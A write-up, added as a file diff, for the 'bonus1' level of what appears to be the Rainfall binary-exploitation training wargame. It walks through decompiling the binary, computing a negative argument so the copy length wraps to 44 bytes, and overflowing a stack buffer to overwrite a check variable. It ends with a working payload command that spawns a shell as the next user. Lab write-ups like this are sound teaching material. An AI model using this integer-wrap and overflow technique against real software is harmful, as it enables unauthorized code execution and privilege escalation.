@@ -1,0 +1,232 @@
+Rainfall — Bonus 1 Writeup
+Decompilation
+
+We opened the binary in Ghidra. The entire vulnerability is contained in main:
+
+undefined4 main(undefined4 param_1, int param_2)
+{
+  undefined4 uVar1;
+  undefined1 local_3c[40];
+  int local_14;
+
+  local_14 = atoi(*(char **)(param_2 + 4));
+  if (local_14 < 10) {
+    memcpy(local_3c, *(void **)(param_2 + 8), local_14 * 4);
+    if (local_14 == 0x574f4c46) {
+      execl("/bin/sh", "sh", 0);
+    }
+    uVar1 = 0;
+  }
+  else {
+    uVar1 = 1;
+  }
+  return uVar1;
+}
+
+The program reads argv[1] with atoi and stores the result in local_14. If the value is less than 10, it copies local_14 * 4 bytes from argv[2] into a 40-byte local buffer.
+
+After the copy, it checks whether local_14 has become 0x574f4c46. If it has, the program executes /bin/sh.
+
+The corresponding assembly shows exactly where both local variables are stored:
+
+0x08048438 <+20>: call   0x8048360 <atoi@plt>
+0x0804843d <+25>: mov    DWORD PTR [esp+0x3c],eax
+0x08048441 <+29>: cmp    DWORD PTR [esp+0x3c],0x9
+...
+0x0804844f <+43>: mov    eax,DWORD PTR [esp+0x3c]
+0x08048453 <+47>: lea    ecx,[eax*4+0x0]
+...
+0x08048464 <+64>: lea    eax,[esp+0x14]
+...
+0x08048473 <+79>: call   0x8048320 <memcpy@plt>
+0x08048478 <+84>: cmp    DWORD PTR [esp+0x3c],0x574f4c46
+...
+0x08048499 <+117>: call   0x8048350 <execl@plt>
+Vulnerability identification
+
+From the decompilation and assembly we identified three key facts.
+
+First, the destination of memcpy is a 40-byte stack buffer:
+
+undefined1 local_3c[40];
+
+Second, the number of bytes copied is calculated from a signed integer controlled through argv[1]:
+
+local_14 = atoi(argv[1]);
+memcpy(local_3c, argv[2], local_14 * 4);
+
+The program only rejects values greater than or equal to 10:
+
+if (local_14 < 10)
+
+Negative values therefore pass the check.
+
+Third, local_14 is stored immediately after the 40-byte destination buffer. By overflowing local_3c, we can overwrite local_14 with the value required by the comparison:
+
+0x574f4c46
+
+On a little-endian system, that DWORD must be written as:
+
+\x46\x4c\x4f\x57
+
+Therefore, placing those four bytes over local_14 satisfies the condition and causes the program to execute /bin/sh.
+
+Locating the local variables
+
+We set a breakpoint immediately after memcpy, at 0x08048478, and ran the program with:
+
+run 3 AAAA
+
+At the breakpoint, the stack pointer was:
+
+esp = 0xbffff6f0
+
+The local-variable addresses should not be identified by searching for familiar values in the stack dump. Both argc and local_14, for example, contained the value 3 during this execution. Instead, their addresses can be calculated directly from the assembly operands.
+
+The destination buffer is loaded here:
+
+lea eax,[esp+0x14]
+
+Therefore:
+
+local_3c = esp + 0x14
+         = 0xbffff6f0 + 0x14
+         = 0xbffff704
+
+This matches the stack dump, where our AAAA input appears as 0x41414141:
+
+0xbffff700:  0xb7fd13e4  0x41414141  0x45485300  0x2f3d4c4c
+                            ^
+                       0xbffff704
+
+The integer returned by atoi is stored here:
+
+mov DWORD PTR [esp+0x3c],eax
+
+Therefore:
+
+local_14 = esp + 0x3c
+         = 0xbffff6f0 + 0x3c
+         = 0xbffff72c
+
+The value is visible as the fourth word on the line beginning at 0xbffff720:
+
+0xbffff720:  0xb7fed280  0x00000000  0x080484b9  0x00000003
+                                                     ^
+                                                0xbffff72c
+
+Each displayed word occupies four bytes, so the addresses on that line are:
+
+0xbffff720
+0xbffff724
+0xbffff728
+0xbffff72c
+
+A second 3 appeared at 0xbffff740:
+
+0xbffff740:  0x00000003  0xbffff7d4  0xbffff7e4  0xb7fdc858
+
+However, this value is not local_14. It is argc, located in the original function frame at [ebp+8].
+
+The function accesses argv using:
+
+mov eax,DWORD PTR [ebp+0xc]
+
+On 32-bit x86, the original stack frame contains:
+
+[ebp+0x4]  return address
+[ebp+0x8]  argc
+[ebp+0xc]  argv
+
+Here, ebp is 0xbffff738, which means:
+
+ebp + 0x8 = 0xbffff740  -> argc
+ebp + 0xc = 0xbffff744  -> argv
+
+The stack pointer was realigned in the function prologue:
+
+push ebp
+mov  ebp,esp
+and  esp,0xfffffff0
+sub  esp,0x40
+
+Because of this alignment, the local variables are addressed relative to the new value of esp, while the original function arguments remain accessible relative to ebp.
+
+The distance between the actual destination buffer and local_14 is:
+
+0xbffff72c - 0xbffff704 = 0x28 = 40 bytes
+
+The overwrite therefore requires exactly 40 bytes of padding followed by:
+
+\x46\x4c\x4f\x57
+Integer overflow in the copy length
+
+Passing a normal positive value cannot produce the required overflow.
+
+The destination buffer is 40 bytes long, and the program only accepts values below 10. The largest normal accepted value is 9, which copies:
+
+9 * 4 = 36 bytes
+
+This is not enough to reach local_14.
+
+A simple negative value such as -1 does pass the comparison, but it does not produce a small copy:
+
+-1 * 4 = 0xfffffffc
+
+memcpy receives its third argument as an unsigned size_t, so this becomes 4,294,967,292 bytes and causes a segmentation fault.
+
+We instead need a negative integer whose multiplication by four wraps around to exactly 44 bytes: 40 bytes to fill local_3c, followed by four bytes to overwrite local_14.
+
+The required equation is:
+
+n * 4 ≡ 44 mod 2^32
+
+Dividing by four gives:
+
+n ≡ 11 mod 2^30
+
+Choosing the negative representative:
+
+n = 11 - 2^30
+  = 11 - 1073741824
+  = -1073741813
+
+In 32-bit arithmetic:
+
+-1073741813 * 4 = 44
+
+after integer wraparound.
+
+This value passes the signed comparison because it is less than 10, but the multiplication produces a memcpy length of exactly 44 bytes.
+
+Exploit plan and execution
+
+The exploit uses the two command-line arguments as follows:
+
+argv[1] = -1073741813
+argv[2] = 40 bytes of padding followed by \x46\x4c\x4f\x57
+
+The negative integer passes the condition:
+
+local_14 < 10
+
+Its multiplication by four wraps around to 44, causing memcpy to copy exactly 44 bytes into the 40-byte local buffer.
+
+The first 40 bytes fill local_3c. The final four bytes overwrite local_14:
+
+"A" * 40 + "\x46\x4c\x4f\x57"
+
+After the copy, the comparison reads the overwritten DWORD:
+
+if (local_14 == 0x574f4c46)
+
+Because the bytes were written in little-endian order as \x46\x4c\x4f\x57, the condition succeeds and execl launches a shell.
+
+The final payload is:
+
+./bonus1 -1073741813 "$(python2 -c 'import sys; sys.stdout.write("A"*40 + "\x46\x4c\x4f\x57")')"
+
+Execution gives us the next user:
+
+$ whoami
+bonus2
